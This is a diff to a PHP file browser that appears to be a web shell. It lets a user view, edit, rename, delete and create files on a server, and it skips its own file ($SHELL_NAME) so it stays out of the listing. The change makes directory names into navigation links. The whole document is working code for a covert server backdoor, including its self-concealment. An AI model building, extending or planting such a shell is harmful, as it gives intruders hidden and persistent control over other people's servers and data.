@@ -482,49 +482,54 @@ function cancelRename(id) {
     <?php else: ?>
         <h2>Files and Directories</h2>
         <ul>
-            <?php
-            if ($real_path !== $base_dir) {
-                $parent_path = dirname($current_rel_path);
-                echo '<li><a href="?path=' . urlencode($parent_path) . '">[..]</a></li>';
-            }
-            $id_counter = 0;
-            foreach ($files as $file) {
-                if ($file === '.' || $file === '..') continue;
-                if ($file === $SHELL_NAME) continue;
-                $full_path = $real_path . DIRECTORY_SEPARATOR . $file;
-                $is_dir = is_dir($full_path);
-                $id = $id_counter++;
-                echo '<li>';
-                echo '<span class="' . ($is_dir ? 'dir' : 'file') . '">' . htmlspecialchars($file) . '</span>';
-                echo '<div class="file-actions">';
-                if (!$is_dir) {
-                    echo '<a href="?view=' . urlencode($current_rel_path . DIRECTORY_SEPARATOR . $file) . '" style="color:#00ff00; text-decoration:none;"><button type="button">Edit</button></a>';
-                }
-                // Rename display and form
-                echo '<span id="rename-display-' . $id . '">';
-                echo '<button type="button" onclick="showRenameForm(' . $id . ')">Rename</button>';
-                echo '</span>';
-                echo '<form method="POST" class="rename-form" id="rename-form-' . $id . '" style="display:none;" onsubmit="return this.newname.value.trim() !== \'\';">';
-                echo '<input type="hidden" name="action" value="rename" />';
-                echo '<input type="hidden" name="target" value="' . htmlspecialchars($file) . '" />';
-                echo '<input type="hidden" name="current_path" value="' . htmlspecialchars($current_rel_path) . '" />';
-                echo '<input type="text" name="newname" id="rename-input-' . $id . '" value="' . htmlspecialchars($file) . '" required />';
-                echo '<button type="submit">Save</button>';
-                echo '<button type="button" onclick="cancelRename(' . $id . ')">Cancel</button>';
-                echo '</form>';
-                // Delete button with confirmation
-                echo '<form method="POST" style="display:inline;" onsubmit="return confirmDelete(\'' . addslashes($file) . '\');">';
-                echo '<input type="hidden" name="action" value="delete" />';
-                echo '<input type="hidden" name="target" value="' . htmlspecialchars($file) . '" />';
-                echo '<input type="hidden" name="current_path" value="' . htmlspecialchars($current_rel_path) . '" />';
-                echo '<button type="submit">Delete</button>';
-                echo '</form>';
-                echo '</div>';
-                echo '</li>';
-            }
-            ?>
-        </ul>
-
+    <?php
+    if ($real_path !== $base_dir) {
+        $parent_path = dirname($current_rel_path);
+        echo '<li><a href="?path=' . urlencode($parent_path) . '">[..]</a></li>';
+    }
+    $id_counter = 0;
+    foreach ($files as $file) {
+        if ($file === '.' || $file === '..') continue;
+        if ($file === $SHELL_NAME) continue;
+        $full_path = $real_path . DIRECTORY_SEPARATOR . $file;
+        $is_dir = is_dir($full_path);
+        $id = $id_counter++;
+        echo '<li>';
+        if ($is_dir) {
+            // Directory name is a link to navigate into it
+            $dir_rel_path = ltrim($current_rel_path . DIRECTORY_SEPARATOR . $file, DIRECTORY_SEPARATOR);
+            echo '<a href="?path=' . urlencode($dir_rel_path) . '" class="dir">' . htmlspecialchars($file) . '</a>';
+        } else {
+            echo '<span class="file">' . htmlspecialchars($file) . '</span>';
+        }
+        echo '<div class="file-actions">';
+        if (!$is_dir) {
+            echo '<a href="?view=' . urlencode($current_rel_path . DIRECTORY_SEPARATOR . $file) . '" style="color:#00ff00; text-decoration:none;"><button type="button">Edit</button></a>';
+        }
+        // Rename display and form
+        echo '<span id="rename-display-' . $id . '">';
+        echo '<button type="button" onclick="showRenameForm(' . $id . ')">Rename</button>';
+        echo '</span>';
+        echo '<form method="POST" class="rename-form" id="rename-form-' . $id . '" style="display:none;" onsubmit="return this.newname.value.trim() !== \'\';">';
+        echo '<input type="hidden" name="action" value="rename" />';
+        echo '<input type="hidden" name="target" value="' . htmlspecialchars($file) . '" />';
+        echo '<input type="hidden" name="current_path" value="' . htmlspecialchars($current_rel_path) . '" />';
+        echo '<input type="text" name="newname" id="rename-input-' . $id . '" value="' . htmlspecialchars($file) . '" required />';
+        echo '<button type="submit">Save</button>';
+        echo '<button type="button" onclick="cancelRename(' . $id . ')">Cancel</button>';
+        echo '</form>';
+        // Delete button with confirmation
+        echo '<form method="POST" style="display:inline;" onsubmit="return confirmDelete(\'' . addslashes($file) . '\');">';
+        echo '<input type="hidden" name="action" value="delete" />';
+        echo '<input type="hidden" name="target" value="' . htmlspecialchars($file) . '" />';
+        echo '<input type="hidden" name="current_path" value="' . htmlspecialchars($current_rel_path) . '" />';
+        echo '<button type="submit">Delete</button>';
+        echo '</form>';
+        echo '</div>';
+        echo '</li>';
+    }
+    ?>
+</ul>
         <h2>Create New File</h2>
         <form method="POST" autocomplete="off">
             <input type="hidden" name="action" value="create" />
